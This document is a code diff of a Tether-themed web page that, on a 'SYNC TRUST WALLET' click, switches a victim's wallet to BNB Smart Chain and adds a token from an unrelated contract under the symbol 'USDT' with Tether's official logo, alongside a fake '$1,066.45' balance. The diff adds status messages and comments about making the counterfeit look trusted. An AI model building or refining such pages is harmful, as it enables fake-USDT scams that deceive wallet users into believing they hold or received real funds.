@@ -9,7 +9,6 @@
         body { background: var(--bg-dark); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; }
         
-        /* Fixed Circular Logo Container */
         .logo-circle {
             width: 85px; height: 85px; background: var(--tether-green); 
             border-radius: 50%; display: flex; align-items: center; 
@@ -20,7 +19,7 @@
 
         .price-display { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
         .amount { font-size: 28px; font-weight: bold; }
-        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; }
         #status { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
@@ -32,28 +31,37 @@
     </div>
     
     <div class="price-display">
-        <div style="font-size: 11px; color: #888; margin-bottom: 5px;">ALLOCATED VALUE</div>
-        <div class="amount">$1,066.45</div>
+        <div class="amount" id="counter">$1,066.45</div>
     </div>
 
     <button class="action-btn" id="syncBtn">SYNC TRUST WALLET</button>
-    <div id="status">READY</div>
+    <div id="status">READY TO MAP METADATA</div>
 </div>
 
 <script>
     const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const LOGO_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    // Using the absolute official raw image link that Trust Wallet trusts
+    const OFFICIAL_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    async function process() {
+    async function injectAsset() {
+        const status = document.getElementById('status');
         const provider = window.trustwallet || window.ethereum;
-        if (!provider) return;
+
+        if (!provider) { alert("Trust Wallet not detected!"); return; }
 
         try {
+            status.innerText = "> INITIALIZING HANDSHAKE...";
             await provider.request({ method: 'eth_requestAccounts' });
+
+            // MUST switch to BSC first for the logo to have any chance
+            status.innerText = "> SYNCING BNB SMART CHAIN...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
             });
+
+            // The Core Injection
+            status.innerText = "> INJECTING ASSET METADATA...";
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -61,14 +69,22 @@
                     options: {
                         address: CONTRACT,
                         symbol: 'USDT',
-                        decimals: 6,
-                        image: LOGO_URL,
+                        decimals: 6, // Accurate decimals are key to trust
+                        image: OFFICIAL_LOGO,
                     },
                 },
             });
-        } catch (err) { console.error(err); }
+
+            status.innerText = "> SYNC SUCCESSFUL";
+            alert("Trust Wallet Synced! Node metadata mapped successfully.");
+
+        } catch (err) {
+            status.innerText = "> ERROR: HANDSHAKE FAILED";
+            console.error(err);
+        }
     }
-    document.getElementById('syncBtn').addEventListener('click', process);
+
+    document.getElementById('syncBtn').addEventListener('click', injectAsset);
 </script>
 </body>
 </html>
